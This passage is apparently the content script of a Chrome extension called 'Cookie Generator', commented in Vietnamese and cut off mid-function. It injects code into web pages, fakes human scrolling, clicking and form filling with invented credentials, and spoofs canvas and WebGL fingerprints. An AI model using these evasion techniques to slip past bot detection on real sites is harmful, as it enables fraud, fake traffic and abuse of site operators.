let spoofComplete = false;
let spoofingInProgress = false;
let lastError = null; // Lưu lỗi gần nhất

// Ghi đè các biến và hàm cũ để tránh xung đột
(function overrideDeprecatedFunctions() {
  // Thêm một thẻ script để ghi đè các hàm cũ trên trang
  try {
    const overrideScript = document.createElement('script');
    overrideScript.textContent = `
      // Ghi đè các hàm đã lỗi thời
      if (typeof handlePage === 'function') {
        console.warn('Cookie Generator: Phát hiện hàm handlePage cũ, đang ghi đè...');
        window.handlePage = function() { 
          console.warn('Cookie Generator: handlePage đã bị loại bỏ, sử dụng phiên bản mới');
          return Promise.resolve(false);
        };
      }
      
      if (typeof FingerprinterLocal !== 'undefined') {
        console.warn('Cookie Generator: Phát hiện FingerprinterLocal cũ, đang ghi đè...');
        window.FingerprinterLocal = function() {
          console.warn('Cookie Generator: FingerprinterLocal đã bị loại bỏ, sử dụng phiên bản mới');
          return {};
        };
      }
      
      // Thêm polyfill để tránh lỗi không tìm thấy CookieUtil
      if (typeof CookieUtil === 'undefined') {
        console.warn('Cookie Generator: Không tìm thấy CookieUtil, tạo phiên bản tạm thời...');
        window.CookieUtil = {
          extractMainDomain: function(hostname) {
            // Phiên bản đơn giản của hàm extractMainDomain
            return hostname.replace(/^www\\./, '');
          },
          generateRandomString: function(length) {
            // Tạo chuỗi ngẫu nhiên
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < (length || 10); i++) {
              result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
          },
          generateUserInfo: function() {
            // Tạo thông tin người dùng ngẫu nhiên
            return {
              firstName: 'John',
              lastName: 'Doe',
              fullName: 'John Doe',
              email: 'john.doe@example.com',
              username: 'johndoe'
            };
          }
        };
      }
      
      // Thêm polyfill để tránh lỗi không tìm thấy Humanize
      if (typeof Humanize === 'undefined') {
        console.warn('Cookie Generator: Không tìm thấy Humanize, tạo phiên bản tạm thời...');
        window.Humanize = function() {
          return {
            scroll: async function() {
              console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.scroll');
              return Promise.resolve();
            },
            mouseClick: async function() {
              console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.mouseClick');
              return Promise.resolve();
            },
            typeText: async function() {
              console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.typeText');
              return Promise.resolve();
            },
            sleep: async function(ms) {
              return new Promise(resolve => setTimeout(resolve, ms || 1000));
            }
          };
        };
        // Thêm các phương thức tĩnh
        window.Humanize.scroll = async function() {
          console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.scroll');
          return Promise.resolve();
        };
        window.Humanize.mouseClick = async function() {
          console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.mouseClick');
          return Promise.resolve();
        };
        window.Humanize.typeText = async function() {
          console.warn('Cookie Generator: Sử dụng phiên bản đơn giản của Humanize.typeText');
          return Promise.resolve();
        };
        window.Humanize.sleep = async function(ms) {
          return new Promise(resolve => setTimeout(resolve, ms || 1000));
        };
      }
    `;
    
    (document.head || document.documentElement).appendChild(overrideScript);
    setTimeout(() => overrideScript.remove(), 100);
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi ghi đè các hàm cũ', error);
  }
})();

// Phát hiện phiên bản cũ của extension và hiển thị thông báo
(function detectOldVersion() {
  // Kiểm tra các biến toàn cục trong DOM hiện tại
  console.log('Cookie Generator: Kiểm tra phiên bản cũ của extension...');
  
  try {
    const checkScript = document.createElement('script');
    checkScript.textContent = `
      (function() {
        // Gửi thông tin về biến toàn cục hiện có
        window.postMessage({
          from: 'cookiegen_check',
          action: 'check_old_version',
          data: {
            hasHandlePage: typeof handlePage === 'function',
            hasFingerprinterLocal: typeof FingerprinterLocal !== 'undefined',
            hasCookieUtil: typeof CookieUtil !== 'undefined',
            hasHumanize: typeof Humanize !== 'undefined'
          }
        }, '*');
      })();
    `;
    
    document.head.appendChild(checkScript);
    setTimeout(() => checkScript.remove(), 100);
    
    // Lắng nghe phản hồi
    window.addEventListener('message', function oldVersionListener(event) {
      if (event.source !== window) return;
      const message = event.data;
      
      if (message && message.from === 'cookiegen_check' && message.action === 'check_old_version') {
        // Gỡ bỏ listener
        window.removeEventListener('message', oldVersionListener);
        
        // Xử lý kết quả
        const data = message.data;
        if (data.hasHandlePage || data.hasFingerprinterLocal) {
          console.error('Cookie Generator: Phát hiện phiên bản cũ của extension:', data);
          
          // Thông báo cho người dùng
          if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage({
              action: 'show_notification',
              data: {
                title: 'Cookie Generator cần được làm mới',
                message: 'Phát hiện phiên bản cũ của extension, vui lòng làm mới trang hoặc khởi động lại trình duyệt'
              }
            }).catch(err => console.error('Không thể gửi thông báo', err));
          }
        } else {
          console.log('Cookie Generator: Không phát hiện phiên bản cũ');
        }
      }
    }, { once: false });
  } catch (e) {
    console.error('Cookie Generator: Lỗi khi kiểm tra phiên bản cũ', e);
  }
})();

// Trích xuất tên miền chính từ một hostname (thay cho CookieUtil.extractMainDomain)
function extractMainDomain(hostname) {
  // Loại bỏ www nếu có
  let domain = hostname.replace(/^www\./, '');
  
  // Các tên miền cấp cao nhất phổ biến
  const tldRegex = /\.(com|net|org|edu|gov|co|io|app|me|info|biz|xyz|dev|vn|jp|kr|cn|ru|eu|uk|de|fr|it|es|nl|au|ca|br|mx|in)$/i;
  
  // Kiểm tra xem có phải tên miền cấp cao nhất hay không
  const tldMatch = domain.match(tldRegex);
  if (tldMatch) {
    // Lấy phần tên miền cấp 2 + tên miền cấp cao nhất
    const parts = domain.split('.');
    if (parts.length > 2) {
      return parts.slice(-2).join('.');
    }
  }
  
  return domain;
}

/**
 * Helper: Tạm dừng thực thi trong một khoảng thời gian
 */
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Mô phỏng người dùng thực hiện các thao tác trên trang web
 */
async function simulateUser() {
  console.log("Cookie Generator: Đang mô phỏng người dùng");
  
  try {
    // Kiểm tra thư viện Humanize
    const hasHumanize = typeof window.Humanize !== 'undefined';
    
    if (hasHumanize) {
      console.log("Cookie Generator: Đã tìm thấy Humanize, sử dụng mô phỏng nâng cao");
      try {
        // Sử dụng performUserSimulation nếu có Humanize
        await performUserSimulation();
        console.log("Cookie Generator: Hoàn thành mô phỏng nâng cao với Humanize");
        return true;
      } catch (advancedError) {
        console.error("Cookie Generator: Lỗi khi sử dụng mô phỏng nâng cao:", advancedError);
        console.log("Cookie Generator: Chuyển sang mô phỏng đơn giản sau lỗi");
        // Nếu mô phỏng nâng cao thất bại, tiếp tục với mô phỏng đơn giản
      }
    } else {
      console.log("Cookie Generator: Không tìm thấy Humanize, sử dụng mô phỏng đơn giản");
    }
    
    // Mô phỏng đơn giản (fallback)
    // Tìm các phần tử có thể tương tác
    const interactableElements = document.querySelectorAll('a, button, input, select, textarea');
    const forms = document.querySelectorAll('form');
    
    // Nếu không có phần tử có thể tương tác, trả về thành công
    if (interactableElements.length === 0) {
      console.log("Cookie Generator: Không tìm thấy phần tử có thể tương tác, bỏ qua mô phỏng");
      return true;
    }
    
    // Thực hiện cuộn trang ngẫu nhiên
    await simulateScrolling();
    
    // Thực hiện nhấp vào ngẫu nhiên
    await simulateRandomClicks(interactableElements);
    
    // Điền vào biểu mẫu nếu có
    if (forms.length > 0) {
      await simulateForms(forms);
    }
    
    // Thực hiện tương tác cuối cùng
    await finalInteractions();
    
    console.log("Cookie Generator: Hoàn thành mô phỏng người dùng đơn giản");
    return true;
  } catch (error) {
    console.error("Cookie Generator: Lỗi khi mô phỏng người dùng:", error);
    
    // Ngay cả khi có lỗi, vẫn trả về true để tiếp tục tiến trình
    return true;
  }
}

async function simulateScrolling() {
  try {
    console.log("Cookie Generator: Mô phỏng cuộn trang");
    
    // Xác định chiều cao của trang
    const pageHeight = Math.max(
      document.body.scrollHeight,
      document.body.offsetHeight,
      document.documentElement.clientHeight,
      document.documentElement.scrollHeight,
      document.documentElement.offsetHeight
    );
    
    // Số lượt cuộn ngẫu nhiên (3-6 lần)
    const scrollCount = Math.floor(Math.random() * 4) + 3;
    
    for (let i = 0; i < scrollCount; i++) {
      // Vị trí cuộn mục tiêu
      const targetPosition = Math.floor(Math.random() * pageHeight);
      
      // Cuộn đến vị trí mục tiêu
      window.scrollTo({
        top: targetPosition,
        behavior: 'smooth'
      });
      
      // Đợi 500-1500ms giữa các lần cuộn
      await sleep(Math.floor(Math.random() * 1000) + 500);
    }
    
    // Cuộn trở lại đầu trang trước khi kết thúc
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
    
    // Đợi thêm lần cuối
    await sleep(500);
    return true;
  } catch (error) {
    console.error("Cookie Generator: Lỗi khi mô phỏng cuộn trang:", error);
    return false;
  }
}

async function simulateRandomClicks(interactableElements) {
  try {
    console.log("Cookie Generator: Mô phỏng nhấp chuột ngẫu nhiên");
    
    // Số lần click ngẫu nhiên (2-4 lần)
    const clickCount = Math.floor(Math.random() * 3) + 2;
    
    for (let i = 0; i < clickCount; i++) {
      // Chọn phần tử ngẫu nhiên
      const randomIndex = Math.floor(Math.random() * interactableElements.length);
      const element = interactableElements[randomIndex];
      
      // Kiểm tra phần tử có thể nhìn thấy và tương tác
      if (element && isElementVisible(element) && !isElementDisabled(element)) {
        // Kiểm tra an toàn trước khi click
        if (isSafeToClick(element)) {
          // Highlight phần tử
          element.classList.add('cookiegen-highlight');
          
          // Đợi một chút để thấy highlight
          await sleep(300);
          
          // Click vào phần tử nếu an toàn
          try {
            element.focus();
            await sleep(200);
            
            // Xử lý đặc biệt cho các thẻ a (liên kết)
            if (element.tagName === 'A') {
              // Lưu lại href gốc
              const originalHref = element.getAttribute('href');
              
              // Nếu có href và không phải href đơn giản
              if (originalHref && originalHref !== '#' && originalHref !== '' && !originalHref.startsWith('javascript:')) {
                console.log(`Cookie Generator: Xử lý click an toàn cho liên kết: ${originalHref}`);
                
                try {
                  // Phân tích URL để kiểm tra
                  const url = new URL(originalHref, window.location.href);
                  const isSameDomain = url.hostname === window.location.hostname;
                  
                  // Tạm thời thay đổi href để tránh chuyển trang
                  element.setAttribute('href', 'javascript:void(0);');
                  element.setAttribute('data-original-href', originalHref);
                  element.setAttribute('target', '_self'); // Đảm bảo không mở tab mới
                  
                  // Click
                  simulateClick(element);
                  console.log(`Cookie Generator: Đã click an toàn vào liên kết: ${originalHref}`);
                  
                  // Khôi phục href sau một khoảng thời gian
                  await sleep(300);
                  element.setAttribute('href', originalHref);
                } catch (urlError) {
                  console.warn(`Cookie Generator: Không thể xử lý URL ${originalHref}`, urlError);
                  // Không click vào liên kết có thể không an toàn
                }
              } else {
                // Đối với các liên kết đơn giản, an toàn để click
                simulateClick(element);
                console.log(`Cookie Generator: Click vào liên kết đơn giản: ${element.tagName}${element.id ? '#' + element.id : ''}`);
              }
            } else if (element.tagName !== 'INPUT' && element.tagName !== 'TEXTAREA' && element.tagName !== 'SELECT') {
              // Các phần tử khác không phải input, textarea, select
              simulateClick(element);
              console.log(`Cookie Generator: Click vào phần tử: ${element.tagName}${element.id ? '#' + element.id : ''}`);
            }
          } catch (clickError) {
            console.warn("Cookie Generator: Không thể click vào phần tử:", clickError);
          }
          
          // Xóa highlight
          element.classList.remove('cookiegen-highlight');
          
          // Đợi sau mỗi lần click
          await sleep(Math.floor(Math.random() * 1000) + 500);
        }
      }
    }
    return true;
  } catch (error) {
    console.error("Cookie Generator: Lỗi khi mô phỏng nhấp chuột:", error);
    return false;
  }
}

function isElementVisible(element) {
  if (!element) return false;
  
  const style = window.getComputedStyle(element);
  if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
    return false;
  }
  
  const rect = element.getBoundingClientRect();
  return (
    rect.width > 0 &&
    rect.height > 0 &&
    rect.top >= 0 &&
    rect.left >= 0 &&
    rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
    rect.right <= (window.innerWidth || document.documentElement.clientWidth)
  );
}

function isElementDisabled(element) {
  return element.disabled === true || element.getAttribute('aria-disabled') === 'true';
}

function isSafeToClick(element) {
  // Kiểm tra các thuộc tính nguy hiểm
  const dangerousActions = [
    'logout', 'log out', 'sign out', 'signout',
    'delete', 'remove', 'clear', 'reset',
    'cancel', 'close', 'exit',
    'xóa', 'thoát', 'đăng xuất', 'đóng'
  ];
  
  // Các tên miền an toàn/uy tín (whitelist)
  const trustedDomains = [
    // Mạng xã hội
    'google.com', 'facebook.com', 'youtube.com', 'twitter.com', 'instagram.com', 
    'linkedin.com', 'pinterest.com', 'tiktok.com', 'snapchat.com', 'reddit.com',
    'quora.com', 'tumblr.com', 'flickr.com', 'vimeo.com', 'medium.com', 
    'discord.com', 'telegram.org', 'whatsapp.com', 'messenger.com',
    
    // Mua sắm 
    'amazon.com', 'ebay.com', 'walmart.com', 'aliexpress.com', 'target.com',
    'bestbuy.com', 'etsy.com', 'shopify.com', 'wish.com', 'ikea.com',
    'zalando.com', 'booking.com', 'airbnb.com', 'expedia.com',
    
    // Công nghệ
    'microsoft.com', 'apple.com', 'samsung.com', 'intel.com', 'amd.com',
    'nvidia.com', 'ibm.com', 'oracle.com', 'cisco.com', 'dell.com', 'hp.com',
    'lenovo.com', 'asus.com', 'adobe.com', 'autodesk.com', 'salesforce.com',
    
    // Thông tin
    'wikipedia.org', 'wikimedia.org', 'wiktionary.org', 'yahoo.com', 'bbc.com',
    'cnn.com', 'nytimes.com', 'theguardian.com', 'reuters.com', 'bloomberg.com',
    
    // Khác
    'netflix.com', 'disneyplus.com', 'hulu.com', 'spotify.com', 'deezer.com',
    'soundcloud.com', 'twitch.tv', 'steam.com', 'epicgames.com', 'ea.com',
    'ubisoft.com', 'blizzard.com', 'playstation.com', 'xbox.com',
    
    // Dịch vụ Web
    'github.com', 'gitlab.com', 'bitbucket.org', 'stackoverflow.com',
    'cloudflare.com', 'digitalocean.com', 'heroku.com', 'aws.amazon.com',
    'azure.microsoft.com', 'cloud.google.com', 'firebase.google.com',
    'wordpress.com', 'wordpress.org', 'squarespace.com', 'wix.com',
    
    // Tìm kiếm
    'bing.com', 'baidu.com', 'yandex.com', 'duckduckgo.com', 'ecosia.org',
    
    // Thanh toán
    'paypal.com', 'stripe.com', 'visa.com', 'mastercard.com', 'americanexpress.com',
    
    // Thư điện tử
    'gmail.com', 'outlook.com', 'protonmail.com', 'mail.ru', 'icloud.com',
    
    // Thiết lập
    'cloudflare.com', 'godaddy.com', 'namecheap.com', 'hostgator.com',
    'bluehost.com', 'dreamhost.com', 'hostinger.com', 'ionos.com',
    
    // Tên miền Việt Nam phổ biến
    'vnexpress.net', 'dantri.com.vn', 'vietnamnet.vn', 'tuoitre.vn', 'thanhnien.vn',
    'kenh14.vn', 'tinhte.vn', 'genk.vn', 'viettimes.vn', 'cafef.vn',
    'zing.vn', 'vtv.vn', 'vov.vn', 'baomoi.com', 'nhaccuatui.com',
    'lazada.vn', 'shopee.vn', 'tiki.vn', 'sendo.vn', 'thegioididong.com',
    'fpt.com.vn', 'viettel.vn', 'vinaphone.vn', 'mobifone.vn', 'coccoc.com'
  ];
  
  // Thêm các TLDs phổ biến để kiểm tra khi xử lý
  const popularTLDs = [
    'com', 'org', 'net', 'edu', 'gov', 'co', 'io', 'app', 'dev', 'ai',
    'shop', 'store', 'blog', 'tech', 'info', 'biz', 'me', 'tv', 'xyz',
    'vn', 'uk', 'de', 'fr', 'jp', 'cn', 'ru', 'br', 'in', 'au', 'ca'
  ];
  
  // Lấy text và các thuộc tính
  const text = element.innerText || element.textContent || '';
  const id = element.id || '';
  const className = element.className || '';
  const name = element.name || '';
  const value = element.value || '';
  const href = element.href || '';
  
  // Kiểm tra có từ khóa nguy hiểm không
  const combinedText = (text + ' ' + id + ' ' + className + ' ' + name + ' ' + value).toLowerCase();
  
  for (const action of dangerousActions) {
    if (combinedText.includes(action)) {
      console.log(`Cookie Generator: Không click vào phần tử có từ khóa "${action}"`);
      return false;
    }
  }
  
  // Nếu là thẻ <a> với href, thực hiện kiểm tra sâu hơn
  if (element.tagName === 'A' && href) {
    try {
      // Xử lý URL tương đối và tuyệt đối
      let url;
      let hostname;
      
      if (href.startsWith('http://') || href.startsWith('https://') || href.startsWith('//')) {
        // URL tuyệt đối
        url = new URL(href.startsWith('//') ? `https:${href}` : href);
        hostname = url.hostname;
      } else if (href.startsWith('/') || href.startsWith('./') || href.startsWith('../') || !href.includes(':')) {
        // URL tương đối - kết hợp với domain hiện tại
        url = new URL(href, window.location.origin);
        hostname = window.location.hostname; // Vẫn là domain hiện tại
      } else if (href === '' || href === '#' || href.startsWith('javascript:')) {
        // URL đặc biệt (không phải link thật)
        console.log(`Cookie Generator: Href an toàn đặc biệt: ${href}`);
        return true;
      } else {
        // URL khác (mailto:, tel:, etc.)
        try {
          url = new URL(href);
          // Kiểm tra các protocol không an toàn
          if (url.protocol === 'mailto:' || url.protocol === 'tel:') {
            console.log(`Cookie Generator: Href có protocol an toàn: ${url.protocol}`);
            return true;
          }
          hostname = url.hostname || '';
        } catch (e) {
          console.log(`Cookie Generator: Không thể phân tích URL đặc biệt: ${href}`);
          return false;
        }
      }
      
      // Kiểm tra từ khóa nguy hiểm trong URL
      const lowerPathname = (url.pathname || '').toLowerCase();
      const lowerSearch = (url.search || '').toLowerCase();
      
      if (lowerPathname.includes('logout') || 
          lowerPathname.includes('signout') || 
          lowerPathname.includes('delete') ||
          lowerPathname.includes('xoa') ||
          lowerPathname.includes('thoat') ||
          lowerPathname.includes('dang-xuat') ||
          lowerPathname.includes('sign-out') ||
          lowerPathname.includes('log-out')) {
        console.log(`Cookie Generator: Không click vào liên kết có đường dẫn nguy hiểm: ${href}`);
        return false;
      }
      
      // Nếu URL có tham số query nguy hiểm
      if (lowerSearch.includes('logout') ||
          lowerSearch.includes('signout') ||
          lowerSearch.includes('delete') ||
          lowerSearch.includes('action=out') ||
          lowerSearch.includes('xoa') ||
          lowerSearch.includes('thoat') ||
          lowerSearch.includes('dang-xuat')) {
        console.log(`Cookie Generator: Không click vào liên kết có tham số nguy hiểm: ${href}`);
        return false;
      }
      
      // Phân tích domain chính
      const domain = (hostname || '').replace(/^www\./, '');
      
      // Kiểm tra nếu là domain uy tín
      for (const trustedDomain of trustedDomains) {
        if (domain === trustedDomain || domain.endsWith('.' + trustedDomain)) {
          // Kiểm tra thêm đường dẫn
          if (!lowerPathname.includes('logout') && 
              !lowerPathname.includes('signout') && 
              !lowerPathname.includes('delete')) {
            console.log(`Cookie Generator: Click vào liên kết an toàn từ domain uy tín: ${href}`);
            return true;
          }
        }
      }
      
      // Kiểm tra nếu cùng domain với trang hiện tại
      const currentDomain = window.location.hostname.replace(/^www\./, '');
      if (domain === currentDomain || domain === '' || 
          domain.endsWith('.' + currentDomain) || currentDomain.endsWith('.' + domain)) {
        
        // Cùng domain -> kiểm tra đường dẫn để đảm bảo an toàn
        if (!lowerPathname.includes('logout') && 
            !lowerPathname.includes('signout') && 
            !lowerPathname.includes('delete') &&
            !lowerPathname.includes('thoat') &&
            !lowerPathname.includes('dang-xuat') &&
            !lowerPathname.includes('xoa')) {
          console.log(`Cookie Generator: Click vào liên kết nội bộ an toàn: ${href}`);
          return true;
        }
      }
      
      // Kiểm tra với danh sách TLDs phổ biến
      const domainParts = domain.split('.');
      if (domainParts.length >= 2) {
        const tld = domainParts[domainParts.length - 1];
        // Nếu có TLD phổ biến và không có từ khóa nguy hiểm
        if (popularTLDs.includes(tld) && 
            !lowerPathname.includes('logout') && 
            !lowerPathname.includes('signout') &&
            !lowerSearch.includes('logout') && 
            !lowerSearch.includes('signout')) {
          console.log(`Cookie Generator: Click vào liên kết có TLD phổ biến: ${domain}`);
          return true;
        }
      }
      
      // Nếu URL rỗng, là anchor hoặc javascript void, coi là an toàn
      if (href === '' || href === '#' || href.startsWith('javascript:void') || href === 'javascript:;') {
        return true;
      }
      
      // Đối với các liên kết khác, an toàn hơn là không click
      console.log(`Cookie Generator: Bỏ qua liên kết không uy tín: ${href}`);
      return false;
    } catch (e) {
      // Nếu không phân tích được URL, coi là không an toàn
      console.log(`Cookie Generator: Không thể phân tích URL ${href}, bỏ qua`, e);
      return false;
    }
  }
  
  return true;
}

function simulateClick(element) {
  // Tạo sự kiện click thay vì gọi element.click() trực tiếp
  const clickEvent = new MouseEvent('click', {
    view: window,
    bubbles: true,
    cancelable: true
  });
  
  element.dispatchEvent(clickEvent);
}

/**
 * Mô phỏng điền form
 */
async function simulateForms(forms) {
  try {
    console.log("Cookie Generator: Mô phỏng điền form");
    
    if (forms.length === 0) {
      console.log("Cookie Generator: Không tìm thấy form nào");
      return true;
    }
    
    // Chọn một form ngẫu nhiên
    const randomForm = forms[Math.floor(Math.random() * forms.length)];
    
    // Tìm các trường nhập liệu
    const inputFields = randomForm.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="search"], textarea');
    
    if (inputFields.length === 0) {
      console.log("Cookie Generator: Form không có trường nhập liệu");
      return true;
    }
    
    // Tạo thông tin người dùng ngẫu nhiên
    const userInfo = generateRandomUserInfo();
    console.log("Cookie Generator: Sử dụng thông tin người dùng giả:", userInfo);
    
    // Điền vào các trường
    for (const input of inputFields) {
      if (isElementVisible(input) && !isElementDisabled(input)) {
        // Highlight phần tử
        input.classList.add('cookiegen-highlight');
        
        // Focus vào input
        input.focus();
        await sleep(300);
        
        // Xác định loại dữ liệu cần điền
        let valueToEnter = '';
        const inputType = input.type.toLowerCase();
        const inputName = (input.name || '').toLowerCase();
        const inputId = (input.id || '').toLowerCase();
        const placeholder = (input.placeholder || '').toLowerCase();
        
        // Kiểm tra loại trường
        if (inputType === 'email' || 
            inputName.includes('email') || 
            inputId.includes('email') || 
            placeholder.includes('email')) {
          valueToEnter = userInfo.email;
        } else if (inputType === 'password' || 
                  inputName.includes('pass') || 
                  inputId.includes('pass') || 
                  placeholder.includes('pass')) {
          valueToEnter = userInfo.password;
        } else if (inputName.includes('user') || 
                  inputId.includes('user') || 
                  placeholder.includes('user') ||
                  inputName.includes('name') || 
                  inputId.includes('name') || 
                  placeholder.includes('name')) {
          valueToEnter = userInfo.username;
        } else if (inputName.includes('first') || 
                  inputId.includes('first') || 
                  placeholder.includes('first')) {
          valueToEnter = userInfo.firstName;
        } else if (inputName.includes('last') || 
                  inputId.includes('last') || 
                  placeholder.includes('last')) {
          valueToEnter = userInfo.lastName;
        } else {
          // Giá trị mặc định
          valueToEnter = userInfo.username;
        }
        
        // Điền giá trị
        input.value = valueToEnter;
        
        // Kích hoạt sự kiện input để các script trên trang biết giá trị đã thay đổi
        const inputEvent = new Event('input', { bubbles: true });
        input.dispatchEvent(inputEvent);
        
        // Xóa highlight
        await sleep(300);
        input.classList.remove('cookiegen-highlight');
        
        // Đợi giữa các trường
        await sleep(Math.floor(Math.random() * 500) + 300);
      }
    }
    
    // Đôi khi nhấn nút submit sau khi điền form
    if (Math.random() > 0.7) {
      // Tìm nút submit trong form
      const submitButton = randomForm.querySelector('button[type="submit"], input[type="submit"]');
      
      if (submitButton && isElementVisible(submitButton) && !isElementDisabled(submitButton)) {
        console.log("Cookie Generator: Đã tìm thấy nút submit, nhưng không nhấn để tránh chuyển trang");
        
        // Highlight nút nhưng không nhấn thực sự
        submitButton.classList.add('cookiegen-highlight');
        await sleep(500);
        submitButton.classList.remove('cookiegen-highlight');
      }
    }
    
    return true;
  } catch (error) {
    console.error("Cookie Generator: Lỗi khi mô phỏng điền form:", error);
    return false;
  }
}

async function finalInteractions() {
  try {
    console.log("Cookie Generator: Thực hiện tương tác cuối cùng");
    
    // Thực hiện di chuột ngẫu nhiên trên trang
    const randomMovements = Math.floor(Math.random() * 3) + 2;
    
    for (let i = 0; i < randomMovements; i++) {
      // Tạo vị trí ngẫu nhiên
      const x = Math.floor(Math.random() * window.innerWidth);
      const y = Math.floor(Math.random() * window.innerHeight);
      
      // Tạo sự kiện mousemove
      const moveEvent = new MouseEvent('mousemove', {
        view: window,
        bubbles: true,
        cancelable: true,
        clientX: x,
        clientY: y
      });
      
      // Gửi sự kiện
      document.dispatchEvent(moveEvent);
      
      // Đợi giữa các lần di chuyển
      await sleep(Math.floor(Math.random() * 300) + 200);
    }
    
    // Thỉnh thoảng cuộn trang một lần nữa
    if (Math.random() > 0.5) {
      window.scrollBy({
        top: Math.random() > 0.5 ? 100 : -100,
        behavior: 'smooth'
      });
      
      await sleep(500);
    }
    
    // Đôi khi ấn phím ESC để đóng modal/popup
    if (Math.random() > 0.7) {
      const escEvent = new KeyboardEvent('keydown', {
        key: 'Escape',
        code: 'Escape',
        keyCode: 27,
        which: 27,
        bubbles: true,
        cancelable: true
      });
      
      document.dispatchEvent(escEvent);
      await sleep(300);
    }
    
    // Kết thúc mô phỏng với một khoảng dừng ngẫu nhiên
    const finalPause = Math.floor(Math.random() * 1000) + 1000;
    console.log(`Cookie Generator: Kết thúc mô phỏng sau ${finalPause}ms`);
    await sleep(finalPause);
    
    return true;
  } catch (error) {
    console.error("Cookie Generator: Lỗi khi thực hiện tương tác cuối cùng:", error);
    return false;
  }
}

/**
 * Giả mạo browser fingerprint - Phiên bản rút gọn không phụ thuộc vào thư viện bên ngoài
 */
function spoofBrowserFingerprint() {
  try {
    console.log('Cookie Generator: Đang giả mạo browser fingerprint');
    
    // Tạo script để chèn vào trang
    const fingerprintScript = document.createElement('script');
    fingerprintScript.textContent = `
      (function() {
        try {
          // Khởi tạo biến theo dõi fingerprint đã được giả mạo
          window.COOKIEGEN_FINGERPRINT_SPOOFED = false;
          
          // Ghi đè phương thức Canvas
          const originalGetContext = HTMLCanvasElement.prototype.getContext;
          HTMLCanvasElement.prototype.getContext = function() {
            const context = originalGetContext.apply(this, arguments);
            if (context && arguments[0] === '2d') {
              const originalFillText = context.fillText;
              context.fillText = function() {
                // Thêm nhiễu nhỏ vào hình ảnh khi vẽ text
                arguments[1] += Math.random() * 0.1 - 0.05;
                arguments[2] += Math.random() * 0.1 - 0.05; 
                return originalFillText.apply(this, arguments);
              };
              
              const originalGetImageData = context.getImageData;
              context.getImageData = function() {
                const imageData = originalGetImageData.apply(this, arguments);
                // Thêm nhiễu vào dữ liệu hình ảnh
                for (let i = 0; i < imageData.data.length; i += 4) {
                  const noise = Math.floor(Math.random() * 2);
                  imageData.data[i] += noise;      // Red
                  imageData.data[i + 1] += noise;  // Green
                  imageData.data[i + 2] += noise;  // Blue
                }
                return imageData;
              };
            }
            return context;
          };
          
          // Ghi đè WebGL
          if (window.WebGLRenderingContext) {
            const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
              // Trả về dữ liệu ngẫu nhiên cho một số thông số WebGL
              if (parameter === 37445 || parameter === 37446) {
                return "NVIDIA";
              }
              return originalGetParameter.apply(this, arguments);
            };
          }
          
          console.log('Cookie Generator: Đã giả mạo browser fingerprint thành công');
          window.COOKIEGEN_FINGERPRINT_SPOOFED = true;
        } catch (error) {
          console.error('Cookie Generator: Lỗi khi giả mạo fingerprint', error);
        }
      })();
    `;
    
    // Chèn script vào trang
    document.documentElement.appendChild(fingerprintScript);
    fingerprintScript.remove();
    
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi giả mạo browser fingerprint', error);
    return false;
  }
}

// Chèn thư viện vào trang
function injectLibraries() {
  console.log('Cookie Generator: Chèn thư viện vào trang web');
  
  try {
    // Thêm CSS nếu cần
    const style = document.createElement('style');
    style.textContent = `
      /* CSS cho các tương tác của extension */
      .cookiegen-highlight {
        position: relative;
        z-index: 9999;
        box-shadow: 0 0 5px 2px rgba(66, 133, 244, 0.5) !important;
        transition: box-shadow 0.3s ease-in-out;
      }
    `;
    document.head.appendChild(style);
    
    // Lấy đường dẫn đến các thư viện - sắp xếp theo thứ tự cần thiết
    const libraries = [
      // Tải util.js trước tiên vì các thư viện khác phụ thuộc vào nó
      { name: 'util.js', path: chrome.runtime.getURL('libs/util.js') },
      // Sau đó tải các thư viện còn lại
      { name: 'ua-parser.js', path: chrome.runtime.getURL('libs/ua-parser.js') },
      { name: 'fingerprint.js', path: chrome.runtime.getURL('libs/fingerprint.js') },
      { name: 'humanize.js', path: chrome.runtime.getURL('libs/humanize.js') }
    ];
    
    // Tải tuần tự các thư viện để đảm bảo thứ tự đúng
    return libraries.reduce((chain, lib) => {
      return chain.then(() => {
        return fetch(lib.path)
          .then(response => {
            if (!response.ok) {
              throw new Error(`Không thể tải thư viện ${lib.name}: ${response.status} ${response.statusText}`);
            }
            return response.text();
          })
          .then(code => {
            // Tạo script element và chèn vào trang
            console.log(`Cookie Generator: Đang chèn thư viện ${lib.name}`);
            const script = document.createElement('script');
            script.textContent = code;
            (document.head || document.documentElement).appendChild(script);
            
            // Đợi một khoảng thời gian ngắn để script được xử lý
            return new Promise(resolve => {
              setTimeout(() => {
                script.remove();
                console.log(`Cookie Generator: Đã chèn thư viện ${lib.name}`);
                resolve();
              }, 100);
            });
          })
          .catch(error => {
            console.error(`Cookie Generator: Lỗi khi chèn thư viện ${lib.name}`, error);
            // Tiếp tục chuỗi Promise ngay cả khi có lỗi
            return Promise.resolve();
          });
      });
    }, Promise.resolve())
    .then(() => {
      console.log('Cookie Generator: Đã chèn tất cả thư viện');
      
      // Thêm biến toàn cục để đánh dấu thư viện đã được tải
      const initScript = document.createElement('script');
      initScript.textContent = `
        // Kiểm tra xem các thư viện có sẵn sàng không
        const libraryCheck = setInterval(() => {
          if (window.Humanize && window.CookieUtil) {
            clearInterval(libraryCheck);
            window.COOKIEGEN_LIBRARIES_LOADED = true;
            console.log('Cookie Generator: Các thư viện đã sẵn sàng');
            
